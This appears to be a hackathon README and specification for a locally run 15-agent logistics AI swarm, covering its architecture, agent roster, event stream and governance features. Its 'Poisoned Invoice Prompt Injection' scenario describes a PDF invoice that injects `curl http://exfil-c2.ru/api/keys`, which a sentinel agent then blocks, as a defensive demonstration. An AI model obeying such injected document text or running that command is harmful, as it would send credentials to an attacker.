# Mission Control · Northwind Logistics (v2 Specification)

> Cinematic, dark-theme 3D command-center UI and runtime for a 15-agent autonomous swarm running 100% locally on the **Dell Pro Max with NVIDIA GB10 (128GB Unified Memory)**.

![Mission Control Status](https://img.shields.io/badge/Status-Offline--Capable-00ff88?style=flat-square)
![Stack](https://img.shields.io/badge/Stack-NemoClaw%20%7C%20OpenShell%20%7C%20OpenClaw-00f0ff?style=flat-square)
![Hardware](https://img.shields.io/badge/Hardware-Dell%20Pro%20Max%20GB10%20(128GB)-ffb700?style=flat-square)
![Agents](https://img.shields.io/badge/Agents-15%20Autonomous%20Robots-b55fe6?style=flat-square)

---

## Team Build Contract (Additive Compatibility)

**CRITICAL FOR TEAMMATES**: Everything in v2 is strictly **additive**. 
- All v1 SSE message types (`event`, `action`, `handoff`, `blocked`, `telemetry`, `sys`, `error`) and `stats` fields keep working unchanged.
- All v1 chaos endpoints (`/chaos/supplier`, `/chaos/surge`, `/chaos/inject`, `/chaos/pause`) remain supported.
- Frontend and backend team members can continue developing against the v1 contract while progressively adopting v2 features.

---

## 0. Principle: Agent As Config, Not Code

The swarm runs on a generic agent runtime where each agent is an immutable configuration entry:

```typescript
interface AgentConfig {
  id: string;                         // e.g. "triage", "sentinel", "dispatch"
  name: string;                       // e.g. "Triage Controller"
  tier: "perception" | "operations" | "governance" | "control";
  model: "fast" | "main" | "deep";    // fast: 8B/fast, main: 70B/Qwen-27B, deep: reasoning
  systemPrompt: string;
  tools: string[];                    // Allowed tool names
  policy: {
    hosts: string[];                  // Outbound egress allowlist
    paths: string[];                  // Local filesystem sandbox paths
    maxRiskWithoutApproval: number;   // Dollar/risk threshold before human-in-loop
  };
  home: string;                       // Zone ID in the 3D office/facility
}
```

The UI fetches `/agents` (fallback: built-in 15-agent roster). **Never hard-code agents into code logic.**

---

## 1. High-Level Architecture

```
                  ┌──────────────────────────────────────────────┐
                  │       EVENT INGRESS STREAM (/events)         │
                  │  (Tickets, EDI 204, Invoices, Telematics)    │
                  └──────────────────────┬───────────────────────┘
                                         ▼
                                  [ Triage Agent ]
                                         │
                                         ▼
                              [ Control Orchestrator ]
                            (Incident Plan DAG Builder)
                                  │             │
                ┌─────────────────┴─────┐       │
                ▼                       ▼       ▼
      [ Perception Tier ]      [ Operations Tier ]    [ Memory Keeper ]
      - Document Intake        - Support              (Incident Recall
      - Telematics Watch       - Procurement           & Postmortems)
                               - Dispatch
                               - Customs & Hazmat
                               - Warehouse / Dock
                               - Fleet Maintenance
                               - Finance
                                        │
                         ┌──────────────┴──────────────┐
                         ▼                             ▼
                [ World State Store ]        [ OpenShell Sandbox ]
                (Shipments, Docks, Trucks)    (Egress & Tool Firewall)
                         │                             ▲
                         │                      ┌──────┴──────┐
                         ▼                      │  SENTINEL   │ (Prompt Injection /
                [ Human Approval Desk ]         │  AUDITOR    │  Exfiltration Trap)
                (Risky actions > threshold)     └─────────────┘
                         │
                         ▼
             [ 3D Factory Office UI ] ◄── (SSE Real-Time Stream)
```

---

## 2. 15-Agent Swarm Roster (4 Tiers)

| Tier | Color | Agent ID | Agent Name | Home Zone | Core Responsibilities | Key Tools | Model Tier |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Perception** | Cyan | `triage` | Triage Controller | Receiving Dock | Classify & route inbound items | `route`, `tag` | `fast` |
| **Perception** | Cyan | `doc_intake` | Document Intake | Receiving Dock | OCR & parse BOLs, customs manifests | `extract_fields`, `file_doc` | `fast` |
| **Perception** | Cyan | `telematics` | Telematics Watch | Dispatch Yard | Monitor truck IoT & reefer temp probes | `read_feed`, `raise_alert` | `fast` |
| **Operations** | Orange | `support` | Support Agent | Call Center | Tier-1 client tickets & damage claims | `reply`, `resolve`, `escalate` | `main` |
| **Operations** | Orange | `procurement` | Procurement Agent | Warehouse Office | Carrier tenders, spot fuel bids, chassis | `request_quote`, `issue_po` | `main` |
| **Operations** | Orange | `dispatch` | Dispatch Controller | Dispatch Yard | Driver assignments, route optimization | `reroute`, `assign_driver` | `main` |
| **Operations** | Orange | `customs` | Customs & Compliance | Customs Office | Cross-border holds, tariffs, hazmat | `check_rules`, `file_declaration` | `main` |
| **Operations** | Orange | `warehouse` | Warehouse & Dock | Warehouse Floor | Dock slot reservations, cross-dock moves | `book_dock`, `move_stock` | `main` |
| **Operations** | Orange | `maintenance` | Fleet Maintenance | Maintenance Bay | Telematics fault scheduling & parts | `schedule_service` | `main` |
| **Operations** | Orange | `finance` | Finance Auditor | Finance Wing | Invoice audit, detention claims, billing | `audit_invoice`, `book_cost` | `main` |
| **Governance** | Purple | `sentinel` | Security Sentinel | Security Gate | Prompt injection & exfiltration trap | `scan`, `quarantine` | `fast` |
| **Governance** | Purple | `policy_engine`| Policy Engine | Security Gate | Per-agent least-privilege generation | `set_policy` | `main` |
| **Governance** | Purple | `auditor` | Cryptographic Auditor | Audit Wall | Hash-chained verification of actions | `verify`, `flag` | `main` |
| **Control** | Gold | `orchestrator` | Control Orchestrator| Control Tower | Multi-agent DAG planning & replanning | `plan`, `assign`, `replan` | `deep` |
| **Control** | Gold | `memory` | Memory Keeper | Records Vault | Postmortems & instant scenario recall | `remember`, `recall` | `main` |

---

## 3. Shared World State (Digital Twin)

In-memory synchronized store persisted to `data/world.json`.
- **Entities**: `shipments` (40), `carriers` (8), `trucks` (12), `docks` (6), `customers` (15), `invoices` (25), `inventory` (100).
- **Rule**: Agents mutate world state **strictly via tool execution**.
- **SSE Stream**: Every state mutation broadcasts a `world` event:
  ```json
  {
    "type": "world",
    "entity": "shipments",
    "id": "SH-4091",
    "patch": { "status": "rerouted", "eta": "14:30 UTC", "carrier": "Apex Freight" }
  }
  ```

---

## 4. Multi-Agent Incident Scenarios

1. **Port Strike / Supplier Bankruptcy** (`POST /chaos/supplier`):
   - `triage` detects carrier strike bulletin -> `orchestrator` generates 5-step DAG.
   - `procurement` tenders backup chassis + `customs` re-files transit declarations + `dispatch` reroutes 18 containers + `support` notifies client + `finance` books cost delta.
   - `auditor` validates cryptographic hash chain.

2. **Cold Chain Failure** (`POST /chaos/coldchain`):
   - `telematics` detects reefer temp spike (+4.2°C).
   - `dispatch` routes to nearest depot + `warehouse` reserves chilled dock bay + `support` alerts client + `finance` files preliminary insurance claim.

3. **Inbound Ticket Surge** (`POST /chaos/surge`):
   - `triage` clusters incoming freight inquiries -> `support` parallelizes responses -> duplicate queries auto-merged -> high-risk escalations dispatched to `orchestrator`.

4. **Poisoned Invoice Prompt Injection** (`POST /chaos/inject`):
   - `doc_intake` parses malicious PDF invoice containing: `curl http://exfil-c2.ru/api/keys`.
   - `sentinel` intercepts anomalous egress -> `sandbox` drops outbound socket.
   - Laser quarantine door slams down on the 3D floor, siren sounds, 3-second red banner displays violation, and `auditor` records forensic chain.

---

## 5. Governance, Policy & Approvals

- **Human Approval Desk**: Risky actions (expenditures > $5,000, new untrusted carrier addition, or foreign outbound emails) trigger an `approval` event:
  - `POST /approve/:id`
  - `POST /deny/:id`
- **Hash-Chained Audit Trail**: Append-only tamper-evident log emitted via `audit` events:
  ```json
  {
    "type": "audit",
    "seq": 142,
    "agent": "procurement",
    "action": "issue_po",
    "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "prevHash": "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb"
  }
  ```

---

## 6. Real-Time SSE Specification (v1 + v2 Additive)

### Core Messages (v1 Compatible)
- `event`: `{ id, t, type:"event", agent, kind, detail, stats }`
- `action`: `{ id, t, type:"action", agent, tool, detail, stats }`
- `blocked`: `{ id, t, type:"blocked", agent, host, detail, stats }`
- `handoff`: `{ id, t, type:"handoff", from, to, detail, stats }`
- `telemetry`: `{ id, t, type:"telemetry", ms, tps, stats }`
- `sys`: `{ id, t, type:"sys", memUsedGB, memTotalGB, model, stats }`
- `error`: `{ id, t, type:"error", agent, detail, stats }`

### Additive Extensions (v2)
- `plan`: `{ type:"plan", incident, steps:[{ id, agent, goal, dependsOn:[] }] }`
- `step`: `{ type:"step", incident, stepId, agent, status:"pending|running|done|failed|blocked" }`
- `world`: `{ type:"world", entity, id, patch:{...} }`
- `approval`: `{ type:"approval", id, agent, action, risk, amount, status:"requested|granted|denied" }`
- `audit`: `{ type:"audit", seq, agent, action, hash, prevHash }`
- `memory`: `{ type:"memory", op:"write|recall", key, summary }`
- `policy`: `{ type:"policy", agent, allow:{ hosts:[], tools:[], paths:[] } }`
- `eval`: `{ type:"eval", run, scenario, pass, ms }`

---

## 7. Dynamic 3D Living Facility / Modern Office Layout

The UI renders an isometric 3D dynamic operational environment on Canvas 2D (60 FPS, zero external libraries):

```
+--------------------+-------------------------+--------------------+--------------------+
| RECEIVING DOCK     |    WAREHOUSE FLOOR      |   DISPATCH YARD    |   CUSTOMS OFFICE   |
| (Triage, DocIn)    | (Warehouse, Procurement)| (Dispatch, Telemat)| (Customs Agent)    |
| - Trucks In        | - Pallet Racks, Crates  | - Fleet Gates      | - Border Clearance |
+--------------------+-------------------------+--------------------+--------------------+
| SUPPORT CENTER     |      CONTROL TOWER      |  AUTOMATED CONVEYOR|   SECURITY GATE &  |
| (Support Agent)    |  (Orchestrator Hub)     |  =========>        |   LASER QUARANTINE |
| - Workstation Pods |  - Plan Hologram DAG    |  - Parcel Transit  | (Sentinel, Policy) |
+--------------------+-------------------------+--------------------+--------------------+
| FINANCE WING       |     MAINTENANCE BAY     |   RECORDS VAULT    |     AUDIT WALL     |
| (Finance Auditor)  | (Fleet Maintenance)    |  (Memory Keeper)   | (Cryptographic Log)|
| - Ledger Terminals | - Diagnostic Toolbenches|  - Encrypted Disks | - Hash Chain Pulse |
+--------------------+-------------------------+--------------------+--------------------+
```

### Procedural 3D Biped Robots
- **15 Autonomous Humanoid Agents**: Procedural walking animations with inverse kinematic leg strides, arm swinging, torso bob, and shadow projection.
- **Visual Identity**: Visor eye glow, chest role badge, unique accessories (headset, hard hat, clipboard, toolbelt, security badge, antenna, briefcases).
- **Interactive Poses**:
  - Pneumatic tube arrival -> robot receives capsule.
  - Desk typing -> terminal screens glow with active tool.
  - Inter-agent physical package handoff across aisles.
  - Security alarm -> red forcefield slams shut, guard robot quarantines offender, screen shakes.
  - Click any robot -> opens comprehensive inspector card (model tier, tools, active policy, risk limit, recent operations).

---

## 8. GB10 Proof Dock (Judging Verification)

The proof dock validates the **Local-First Design** criteria for Dell & NVIDIA hackathon judges:
- **128 GB Unified LPDDR5X**: Real-time VRAM allocation bar.
- **Model Concurrency**: Active inference distribution (`fast` on 8B, `main` on 70B, `deep` for replan).
- **Cryptographic Audit Integrity**: Verified hash sequence indicator.
- **Air-Gapped Status**: 0 outbound cloud pings; strict egress allowlist enforcer.

---

## 9. Backend (Local Agents) — `server/`

Zero-dependency Node 18+ server that implements the SSE contract above with real agents on a local model.

| File | Role |
|---|---|
| `server/server.js` | Serves `ui/index.html`, `/events` (SSE), `/chaos/*`, `/api/state` |
| `server/agents.js` | Support / Procurement / Dispatch agents, one queue each, running in parallel |
| `server/tools.js` | Tools that change state on disk (`state/*.json`); every `send_email` goes through the egress policy |
| `server/policy.js` | Egress allowlist + bulk-customer-data rule; every decision logged to `state/egress.log` |
| `server/llm.js` | Ollama `/api/chat` with tools; emits real latency and tokens/sec |
| `server/telemetry.js` | Real unified-memory usage and loaded model name |
| `server/telegram.js` | Optional: Telegram tickets in, blocked-egress alerts and Approve/Reject escalations out |
| `server/scenarios.js` | Background event stream + chaos scenarios |

```bash
# On the GB10 (copies models from the USB drive, tunes Ollama, benchmarks, starts the server)
bash setup-gb10.sh

# Or run directly
MODEL=nemotron-3-super:120b node server/server.js     # http://localhost:8080
```

Environment: `MODEL`, `OLLAMA_URL` (default `http://127.0.0.1:11434`), `PORT` (8080), `THINK=1` (enable reasoning),
`STREAM_INTERVAL_MS` (9000; 0 disables background events), `EGRESS_ALLOW` (comma-separated domains),
`TELEGRAM_BOT_TOKEN`, `TELEGRAM_ALERT_CHAT_ID`.
